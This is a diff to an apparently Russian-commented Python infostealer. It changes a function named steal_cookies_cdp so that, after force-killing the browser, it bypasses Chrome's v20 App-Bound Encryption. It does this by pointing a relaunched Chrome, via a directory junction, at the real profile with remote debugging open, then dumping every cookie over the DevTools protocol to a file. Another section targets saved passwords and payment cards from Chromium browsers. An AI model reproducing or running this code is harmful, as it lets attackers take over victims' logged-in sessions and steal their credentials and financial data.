@@ -111,7 +111,7 @@ def copy_shared(src: Path, dst: Path) -> bool:
     return False
 
 # ============================================================
-# CDP — обход v20 App-Bound Encryption
+# CDP через Junction (обход v20 App-Bound Encryption)
 # ============================================================
 def steal_cookies_cdp(browser_name, port, user_data_dir):
     print(f"\n[CDP {browser_name}] === START ===")
@@ -130,6 +130,7 @@ def steal_cookies_cdp(browser_name, port, user_data_dir):
         return False
     exe_name = os.path.basename(exe_path)
 
+    # 1. Убиваем всё
     for name in (exe_name, "GoogleCrashHandler.exe", "GoogleCrashHandler64.exe", "chrome_proxy.exe"):
         subprocess.run(["taskkill", "/IM", name, "/F"], capture_output=True, timeout=10)
     time.sleep(4)
@@ -144,54 +145,24 @@ def steal_cookies_cdp(browser_name, port, user_data_dir):
         pass
 
     user_data_dir = Path(user_data_dir)
-    cdp_profile   = WORK / f"_cdp_{browser_name}"
-    if cdp_profile.exists():
-        shutil.rmtree(cdp_profile, ignore_errors=True)
-
-    # 1. robocopy
-    try:
-        r = subprocess.run(
-            ["robocopy", str(user_data_dir), str(cdp_profile),
-             "/E", "/XD", "Cache", "Code Cache", "GPUCache", "ShaderCache",
-             "Service Worker", "Extensions", "IndexedDB",
-             "/R:1", "/W:1", "/NFL", "/NDL", "/NJH", "/NJS"],
-            capture_output=True, timeout=120)
-        print(f"[CDP {browser_name}] robocopy rc={r.returncode}")
-    except Exception as e:
-        print(f"[CDP {browser_name}] robocopy err: {e}")
-        return False
-
-    if not (cdp_profile / "Local State").exists():
-        print(f"[CDP {browser_name}] profile copy failed (no Local State)")
-        return False
-
-    # 2. ФОРС-КОПИРОВАНИЕ залоченных файлов через copy_shared
-    src_def = user_data_dir / "Default"
-    dst_def = cdp_profile / "Default"
-    dst_def.mkdir(parents=True, exist_ok=True)
     
-    src_ls = user_data_dir / "Local State"
-    dst_ls = cdp_profile / "Local State"
-    if src_ls.exists():
-        copy_shared(src_ls, dst_ls)
+    # 2. Создаём Junction
+    junc_path = WORK / f"junc_{browser_name}"
+    if junc_path.exists():
+        safe(os.rmdir, junc_path)
+    
+    r = subprocess.run(["cmd", "/c", "mklink", "/J", str(junc_path), str(user_data_dir)], capture_output=True, text=True)
+    print(f"[CDP {browser_name}] junction rc={r.returncode}")
+    if not junc_path.exists():
+        print(f"[CDP {browser_name}] junction failed: {r.stderr}")
+        return False
 
-    for ck in ("Network/Cookies", "Cookies"):
-        src_ck = src_def / ck
-        if src_ck.exists():
-            dst_ck = dst_def / ck
-            dst_ck.parent.mkdir(parents=True, exist_ok=True)
-            if copy_shared(src_ck, dst_ck):
-                print(f"[CDP {browser_name}] forced copy {ck} -> {dst_ck.stat().st_size} bytes")
-            else:
-                print(f"[CDP {browser_name}] failed to force copy {ck}")
-
-    # 3. Запуск с --profile-directory
+    # 3. Запускаем Chrome на Junction
     args = [
         exe_path,
         f"--remote-debugging-port={port}",
         "--remote-allow-origins=*",
-        f"--user-data-dir={cdp_profile}",
-        "--profile-directory=Default",
+        f"--user-data-dir={junc_path}",
         "--no-first-run",
         "--no-default-browser-check",
         "--disable-gpu",
@@ -199,14 +170,16 @@ def steal_cookies_cdp(browser_name, port, user_data_dir):
         "--disable-background-networking",
         "--disable-component-update",
     ]
-    print(f"[CDP {browser_name}] launching port {port}")
+    print(f"[CDP {browser_name}] launching port {port} on junction")
     try:
         proc = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         print(f"[CDP {browser_name}] pid={proc.pid}")
     except Exception as e:
         print(f"[CDP {browser_name}] Popen err: {e}")
+        safe(os.rmdir, junc_path)
         return False
 
+    # 4. Ждём CDP
     ws_url = None
     for i in range(30):
         time.sleep(1)
@@ -221,9 +194,11 @@ def steal_cookies_cdp(browser_name, port, user_data_dir):
     if not ws_url:
         print(f"[CDP {browser_name}] CDP not up, alive={proc.poll() is None}")
         subprocess.run(["taskkill", "/IM", exe_name, "/F"], capture_output=True)
-        shutil.rmtree(cdp_profile, ignore_errors=True)
+        time.sleep(1)
+        safe(os.rmdir, junc_path)
         return False
 
+    # 5. Запрашиваем куки
     cookies = []
     try:
         ws = websocket.create_connection(ws_url, timeout=10)
@@ -235,9 +210,10 @@ def steal_cookies_cdp(browser_name, port, user_data_dir):
     except Exception as e:
         print(f"[CDP {browser_name}] ws err: {e}")
 
+    # 6. Убиваем и чистим
     subprocess.run(["taskkill", "/IM", exe_name, "/F"], capture_output=True, timeout=10)
-    time.sleep(1)
-    shutil.rmtree(cdp_profile, ignore_errors=True)
+    time.sleep(2)
+    safe(os.rmdir, junc_path)
 
     if cookies:
         with (OUT / f"{browser_name}_CDP_cookies.txt").open("w", encoding="utf-8") as f:
@@ -273,7 +249,7 @@ def reopen_browsers():
             time.sleep(1)
 
 # ============================================================
-# Chromium — пароли, карты, старые cookies (v10/v11)
+# Chromium — пароли, карты
 # ============================================================
 CHROMIUM = {
     "Chrome":  Path(os.environ["LOCALAPPDATA"]) / "Google/Chrome/User Data",
